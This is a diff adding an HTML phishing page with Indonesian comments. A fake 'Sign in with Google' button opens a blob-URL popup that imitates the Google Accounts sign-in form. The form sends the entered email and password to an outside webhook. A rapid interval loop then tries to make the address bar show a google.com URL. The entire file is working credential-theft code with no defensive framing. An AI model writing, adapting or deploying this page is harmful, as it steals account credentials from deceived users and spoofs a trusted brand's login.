@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Google Sign-In</title>
+  <style>
+    body { margin:0; height:100vh; background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; }
+    button { background:#4285f4; color:white; padding:16px 32px; font-size:18px; border:none; border-radius:8px; cursor:pointer; }
+    button:hover { background:#3367d6; }
+  </style>
+</head>
+<body>
+
+<button onclick="spoof()">Sign in with Google</button>
+
+<script>
+function spoof() {
+  // LANGKAH 1: BUAT BLOB DARI HTML PHISHING
+  const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in – Google Accounts</title>
+  <meta charset="utf-8">
+  <style>
+    body { margin:0; padding:40px; font-family:'Google Sans',Arial,sans-serif; background:#fff; text-align:center; }
+    img { width:92px; margin-bottom:30px; }
+    h1 { font-size:24px; color:#333; }
+    input { width:100%; max-width:320px; padding:14px; margin:10px 0; border:1px solid #dadce0; border-radius:8px; font-size:16px; }
+    button { background:#1a73e8; color:white; border:none; padding:14px 32px; border-radius:8px; font-size:16px; cursor:pointer; margin-top:20px; }
+    button:hover { background:#1557b0; }
+  </style>
+</head>
+<body>
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+  <h1>Sign in</h1>
+  <p>Use your Google Account</p>
+
+  <!-- KIRIM KE WEBHOOK KAMU -->
+  <form action="https://polite-whale-73.webhook.cool" method="POST">
+    <input name="email" type="email" placeholder="Email or phone" required autocomplete="username">
+    <input name="pass" type="password" placeholder="Password" required autocomplete="current-password">
+    <br><br>
+    <button type="submit">Next</button>
+  </form>
+</body>
+</html>`;
+
+  // BUAT BLOB + URL
+  const blob = new Blob([htmlContent], { type: "text/html" });
+  const blobURL = URL.createObjectURL(blob);
+
+  // BUKA POPUP DENGAN blob: URL
+  const win = window.open(blobURL, "_blank");
+
+  // RACE LOOP — PAKSA ADDRESS BAR JADI https://accounts.google.com
+  const race = setInterval(() => {
+    try {
+      if (win && !win.closed) {
+        win.location.replace("https://google.com:9090");
+      } else {
+        clearInterval(race);
+      }
+    } catch (e) {}
+  }, 1);
+
+  // Optional: bersihkan blob setelah 10 detik
+  setTimeout(() => URL.revokeObjectURL(blobURL), 10000);
+}
+</script>
+
+</body>
+</html>
